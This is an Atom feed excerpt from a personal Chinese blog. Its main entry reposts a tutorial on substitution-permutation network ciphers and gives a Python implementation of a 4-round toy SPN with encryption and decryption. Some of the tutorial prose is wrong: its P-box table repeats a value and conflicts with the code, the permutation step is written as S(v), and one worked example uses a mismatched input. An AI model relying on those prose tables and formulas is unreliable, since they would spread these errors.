        &lt;h1 id=&quot;差不多得了&quot;&gt;&lt;a href=&quot;#差不多得了&quot; class=&quot;headerlink&quot; title=&quot;差不多得了&quot;&gt;&lt;/a&gt;差不多得了&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;这世界本就没有任何一句话，可以让你醍醐灌顶。真正让你醍醐灌顶的，只能是一段经历。而那句话，
      
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>【转载】Python实现SPN加解密</title>
    <link href="https://xytk0x0.github.io/2019/10/07/Python%E5%AE%9E%E7%8E%B0SPN%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    <id>https://xytk0x0.github.io/2019/10/07/Python实现SPN加解密/</id>
    <published>2019-10-07T08:28:52.000Z</published>
    <updated>2019-10-10T06:00:22.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原文地址：<a href="https://gooong.cn/post/cryptography-part1/" target="_blank" rel="noopener">https://gooong.cn/post/cryptography-part1/</a></p><h1 id="SPN网络"><a href="#SPN网络" class="headerlink" title="SPN网络"></a>SPN网络</h1><p>难道不是要介绍AES吗，怎么会变成SPN网络，这是啥？可以吃吗？  </p><p>AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代换-置换网络（Substitution-Permutation Network）的缩写,是现代对称加密方法设计的蓝本。可以说，了解SPN网络，就基本了解了AES。  </p><p>很巧的是，这个网络正好是容易理解的。SPN网络的思想很简单：既然加密一次不够安全，那我就加密多次，把第一次加密产生的密文再进行加密，解密的时候我连续进行两次解密就可以了，这样是不是就安全了一些呢？  </p><p>对于密码体制S1，其加密与解密函数为E1与D1，对于密码体制S2，其加密与解密函数为E2与D2，我构造出一个新的密码体制S3，其加密函数为：  </p><blockquote><p>c=E2(E1(p)) </p></blockquote><p>解密函数为  </p><blockquote><p>p=D1(D2(c)) </p></blockquote><p>记为  </p><blockquote><p>S3=S1*S2  </p></blockquote><p>这样破解S3就可能会困难些。这个想法是不是很直接呢？这个思想在1949年才被提出，而提出者，可能理科生都多少听过他的名字——香农（Shannon）。  </p><p>注意，不是任何的加密体制都可以这样“乘”起来变得更强，例如对于你的移位密码，嵌套起来还是移位密码（为什么？），没有任何改善，即S1∗S1=S1，这样的密码体制被称为幂等的。  </p><p>如果密码体制不是幂等的，那么多次迭代就可能能够提高安全性，SPN就是使用这种思想，包含多轮的迭代，每轮的操作都是相同的。下面，介绍SPN单轮的操作：</p><h2 id="SPN单轮操作"><a href="#SPN单轮操作" class="headerlink" title="SPN单轮操作"></a>SPN单轮操作</h2><p>SPN网络是对一定长度的比特进行操作的，在本文中的SPN网络中，一次加密的长度为16个比特，即2字节，也就是说每次加密16比特的明文，输出16比特<br>的密文。  </p><p>一个SPN网络包含多轮迭代，每轮迭代的操作内容都一样是：异或运算–&gt;分组代换–&gt;单比特置换</p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>异或运算是比较常见的二元比特运算，用⊕表示，其规则就是“相同得0，不同得1”：  </p><blockquote><p>0 ⊕ 0 = 0<br>1 ⊕ 1 = 0<br>1 ⊕ 0 = 1<br>0 ⊕ 1 = 1  </p></blockquote><p>对于比特串，直接按每一位对应进行计算即可以了：</p><blockquote><p>0011 ⊕ 1010 = 1001</p></blockquote><p>异或的有比较有意思的性质：一个比特串亦或另一个比特串两遍，还是等于他自己，即a ⊕ b ⊕ b = a，这是因为a ⊕ b ⊕ b = a ⊕ ( b ⊕ b ) =a ⊕ 0 = a，可以带入一些例子试试看。  </p><p>SPN网络中，每一轮的第一步就是把输入的比特串w和秘钥k进行亦或：u = w ⊕ k，如：  </p><blockquote><p>0001110000100011 = 0010011010110111 ⊕ 0011101010010100</p></blockquote><p>这一步的目的是根据秘钥对明文进行混淆。如果你只知道输出u而不知道秘钥k，那么你就猜不出实际输入的w是什么，它是什么都可能，而且是等概率的。例如对于1 = a ⊕ b，不告诉你b是0还是1，你就不知道a是什么。而对于和操作，如果知道1 = a and b，那么就能确定a与b都是1。  </p><p>这就是第一步，是不是很简单呢？</p><h3 id="分组代换"><a href="#分组代换" class="headerlink" title="分组代换"></a>分组代换</h3><p>这一步也很简单，将第一步输出的16比特的串分为4组，每组4比特，即0001110000100011写成0001 1100 0010 0011。然后对于每组再根据事先所定的表进行代换，代换表长这样：</p><p>代换前    0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F<br>代换后    E    4    D    1    2    F    B    8    3    A    6    C    5    9    0    7  </p><p>就拿第一列来说，表的意思是：如果你是0（0000），那么我要把你换成E（1110），就是一个简单的映射操作。</p><p>原比特串长这样：0001 1100 0010 0011 &lt;==&gt; 1 C 2 3，再对每个字母查表得到：4 5 D 1 &lt;==&gt; 0100 0101 1101 0001，这样就得到代换后的比特串0100 0101 1101 0001，完成了第二步。</p><p>这个表一般称为S盒（Substitution），这个过程可以用v = S(u)表示，u是第一步异或的结果，也是第二步分组代换的输入，v是第二步的输出。需要注意，S盒的输入和输出一般是非线性的关系。</p><h3 id="单比特置换"><a href="#单比特置换" class="headerlink" title="单比特置换"></a>单比特置换</h3><p>单比特置换是将16比特中的每一比特，根据P盒（Permutation）移动挪位，这样说很不直观，直接上例子，P盒长这样：</p><p>置换前的位置    1    2    3    4    5    6    7    8    9    10    11    12    13    14    15    16<br>置换后的位置    1    5    6    13    2    6    10    14    3    7    11    15    4    8    12    16</p><p>拿第二列来说，表的意思是：第2个比特要挪到第5个比特的位置，举个好看的例子：</p><blockquote><p>0100 0000 0000 0000 置换后为==&gt; 0000 1000 0000 0000</p></blockquote><p>这个例子里面第二个比特的1挪到了第五的位置，而其他位置的比特都是0，挪位置之后还是0。</p><p>对于第二部输出的结果1100 1101 1100 0100，置换后的比特串为0010 1110 0000 0111，这样就完成了第三步。</p><p>这一步可以用W = S(v)表示，v是第二部的输出，也是第三步的输入，W是第三步的输出，P盒置换是一种线性的变换。</p><p>这三步放在一起结果如下，建议读者自己计算一遍：</p><blockquote><p>w = 0010 0110 1011 0111<br>k = 0011 1010 1001 0100<br>第一步，异或运算：<br>u = w ⊕ k = 0001 1100 0010 0011<br>第二步，分组代换：<br>v = S(u) = 0100 0101 1101 0001<br>第三步，单比特置换：<br>W = P(v) = 0010 1110 0000 0111  </p></blockquote><p>可以写成：W = P( S(w ⊕ k) )，这样就完成了一轮迭代，里面用到的参数有k，S盒与P盒，如图（图片来自维基百科）：</p><img src="/2019/10/07/Python实现SPN加解密/danlun.png" title="单轮SPN"><h2 id="SPN的多轮迭代"><a href="#SPN的多轮迭代" class="headerlink" title="SPN的多轮迭代"></a>SPN的多轮迭代</h2><p>弄清楚一轮的流程，SPN整体就很容易明白了，就是一轮一轮的乘起来，上一轮的输出作为这一轮的输入，这是一个4轮SPN的示例：</p><blockquote><p>w0 = x<br>w1 = P(S(w0 ⊕ k1))<br>w2 = P(S(w1 ⊕ k2))<br>w3 = P(S(w2 ⊕ k3))<br>w4 = P(S(w3 ⊕ k4))<br>y = w4</p></blockquote><p>w0就是16比特的明文，w4是4轮操作后的16比特密文结果，是不是很简单？需要注意的是，每一轮迭代的秘钥k是不一样的，一般是由一个基础秘钥经特定秘钥编排算法生成的，而使用的S盒P盒都是相同的，会提前确定好，并且是公开的。</p><p>下图是一个三轮SPN网络的示意图（图片来自维基百科）：</p><img src="/2019/10/07/Python实现SPN加解密/duolun.png" title="多轮SPN"><p>注意在最后一轮去掉了代换操作，这样做可以使SPN网络稍微做一些调整就可以用来进行解密。</p><p>OK! SPN网络就是这些内容，你已经掌握了它，如果你还想和小红传纸条的话，可以试试用它加密，会比移位密码更安全一些。</p><p>什么？自己手动代换置换太麻烦？不用怕，贴心的我已经为你准备好了Python代码。</p><h1 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h1><p>我实现的是4轮迭代的SPN网络，以及加密和解密算法，其结构图如下（图片来自 Cryptography Theory and Practice ）：</p><img src="/2019/10/07/Python实现SPN加解密/spn_3.png" title="spn_3.png"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"># S盒参数</span><br><span class="line">S_Box = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7]</span><br><span class="line"></span><br><span class="line"># P盒参数</span><br><span class="line">P_Box = [1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15, 4, 8, 12, 16]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_K_list(K):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    秘钥编排算法，由一个32比特秘钥生成5个16比特子秘钥</span><br><span class="line">    :param K: 32比特秘钥</span><br><span class="line">    :return: [k1,k2,k3,k4,k5]，五个16比特子秘钥</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Ks = []</span><br><span class="line">    for i in range(5, 0, -1):</span><br><span class="line">        ki = K % (2 ** 16)</span><br><span class="line">        Ks.insert(0, ki)</span><br><span class="line">        K = K &gt;&gt; 4</span><br><span class="line">    return Ks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pi_s(s_box, ur):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    分组代换操作</span><br><span class="line">    :param s_box:S盒参数</span><br><span class="line">    :param ur:输入比特串，16比特</span><br><span class="line">    :return:输出比特串，16比特</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    vr = 0</span><br><span class="line">    for i in range(4):</span><br><span class="line">        uri = ur % (2 ** 4)</span><br><span class="line">        vri = s_box[uri]</span><br><span class="line">        vr = vr + (vri &lt;&lt; (4 * i))</span><br><span class="line">        ur = ur &gt;&gt; 4</span><br><span class="line">    return vr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pi_p(p_box, vr):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    单比特置换操作</span><br><span class="line">    :param p_box:P盒参数</span><br><span class="line">    :param vr:输入比特串，16比特</span><br><span class="line">    :return:输出比特串，16比特</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    wr = 0</span><br><span class="line">    for i in range(15, -1, -1):</span><br><span class="line">        vri = vr % 2</span><br><span class="line">        vr = vr &gt;&gt; 1</span><br><span class="line">        wr = wr + (vri &lt;&lt; (16 - p_box[i]))</span><br><span class="line">    return wr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reverse_Sbox(s_box):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    求S盒的逆</span><br><span class="line">    :param s_box:S盒参数</span><br><span class="line">    :return:S盒的逆</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    re_box = [-1] * 16</span><br><span class="line">    for i in range(16):</span><br><span class="line">        re_box[s_box[i]] = i</span><br><span class="line">    return re_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reverse_Pbox(p_box):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    求P盒的逆</span><br><span class="line">    :param s_box:P盒参数</span><br><span class="line">    :return:P盒的逆</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    re_box = [-1] * 16</span><br><span class="line">    for i in range(16):</span><br><span class="line">        re_box[p_box[i] - 1] = i + 1</span><br><span class="line">    return re_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def do_SPN(x, s_box, p_box, Ks):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    5轮的SPN网络，可以用来进行加密或解密</span><br><span class="line">    :param x: 16比特输入</span><br><span class="line">    :param s_box: S盒参数</span><br><span class="line">    :param p_box: P盒参数</span><br><span class="line">    :param Ks: [k1,k2,k3,k4,k5]，五个16比特子秘钥</span><br><span class="line">    :return: 16比特输出</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    wr = x</span><br><span class="line">    for r in range(3):</span><br><span class="line">        ur = wr ^ Ks[r]  # 异或操作</span><br><span class="line">        vr = pi_s(s_box, ur)  # 分组代换</span><br><span class="line">        wr = pi_p(p_box, vr)  # 单比特置换</span><br><span class="line"></span><br><span class="line">    ur = wr ^ Ks[3]</span><br><span class="line">    vr = pi_s(s_box, ur)</span><br><span class="line">    y = vr ^ Ks[4]</span><br><span class="line">    return y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(K, x):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据秘钥K对16比特明文x进行加密</span><br><span class="line">    :param K:32比特秘钥</span><br><span class="line">    :param x:16比特明文</span><br><span class="line">    :return:16比特密文</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Ks = gen_K_list(K)</span><br><span class="line">    return do_SPN(x, S_Box, P_Box, Ks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(K, y):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据秘钥K对16比特密文y进行解密。</span><br><span class="line">    :param K:32比特秘钥</span><br><span class="line">    :param y:16比特密文</span><br><span class="line">    :return:16比特明文</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Ks = gen_K_list(K)</span><br><span class="line">    Ks.reverse()  # 秘钥逆序编排</span><br><span class="line">    # 秘钥置换</span><br><span class="line">    Ks[1] = pi_p(P_Box, Ks[1])</span><br><span class="line">    Ks[2] = pi_p(P_Box, Ks[2])</span><br><span class="line">    Ks[3] = pi_p(P_Box, Ks[3])</span><br><span class="line"></span><br><span class="line">    s_rbox = reverse_Sbox(S_Box)  # S盒求逆</span><br><span class="line">    p_rbox = reverse_Pbox(P_Box)  # P盒求逆</span><br><span class="line">    return do_SPN(y, s_rbox, p_rbox, Ks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    x = 0b0010011010110111</span><br><span class="line">    K = 0b00111010100101001101011000111111</span><br><span class="line">    print(&apos;初始明文：&apos;, format(x, &apos;016b&apos;))</span><br><span class="line">    print(&apos;加密密文：&apos;, format(encrypt(K, x), &apos;016b&apos;))</span><br><span class="line">    print(&apos;解密结果：&apos;, format(decrypt(K, encrypt(K, x)), &apos;016b&apos;))</span><br><span class="line">    assert decrypt(K, encrypt(K, x)) == x</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;原文地址：&lt;a href=&quot;https://gooong.cn/post/cryptography-part1/&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/categories/Crypto/"/>
    
      <category term="python" scheme="https://xytk0x0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://xytk0x0.github.io/tags/python/"/>
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>第一篇blog</title>
    <link href="https://xytk0x0.github.io/2019/10/06/%E7%AC%AC%E4%B8%80%E7%AF%87blog/"/>
    <id>https://xytk0x0.github.io/2019/10/06/第一篇blog/</id>
    <published>2019-10-06T06:58:22.000Z</published>
    <updated>2019-10-28T01:28:07.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一篇blog"><a href="#第一篇blog" class="headerlink" title="第一篇blog"></a>第一篇blog</h2><p>最近在学习新姿势的时候看了很多师傅的博客，觉得有一个地方能写点东西挺好的。趁着这次国庆假期，自己也搭了一个博客。  </p><p>希望能够记录学习的东西，也希望能够给看得人一点点启发和思考。  </p><h3 id="博客内容简介："><a href="#博客内容简介：" class="headerlink" title="博客内容简介："></a>博客内容简介：</h3><p>1、之前学习的零碎东西大多都在我的ipad里面，之后一部分学习的内容会发布到博客上面。  </p><p>2、之前感觉每天都过得特别快，所以会以日记的形式零散的记录一些生活感悟、梦境和小故事等，之后也会发一些到博客上面。</p><pre><code>print(&quot;Hello My Blog!&quot;)</code></pre><h3 id="PS-我的博客图片还没选好（作为一个重度选择困难者患者，我太难了）"><a href="#PS-我的博客图片还没选好（作为一个重度选择困难者患者，我太难了）" class="headerlink" title="PS:我的博客图片还没选好（作为一个重度选择困难者患者，我太难了）"></a>PS:我的博客图片还没选好（作为一个重度选择困难者患者，我太难了）</h3><h3 id="PS-由于本人水平有限，若博客中出现错误，希望能够及时与我联系。"><a href="#PS-由于本人水平有限，若博客中出现错误，希望能够及时与我联系。" class="headerlink" title="PS:由于本人水平有限，若博客中出现错误，希望能够及时与我联系。"></a>PS:由于本人水平有限，若博客中出现错误，希望能够及时与我联系。</h3><img src="/2019/10/06/第一篇blog/boy_bg.jpg" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一篇blog&quot;&gt;&lt;a href=&quot;#第一篇blog&quot; class=&quot;headerlink&quot; title=&quot;第一篇blog&quot;&gt;&lt;/a&gt;第一篇blog&lt;/h2&gt;&lt;p&gt;最近在学习新姿势的时候看了很多师傅的博客，觉得有一个地方能写点东西挺好的。趁着这次国庆假期，自己也搭
      
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
</feed>
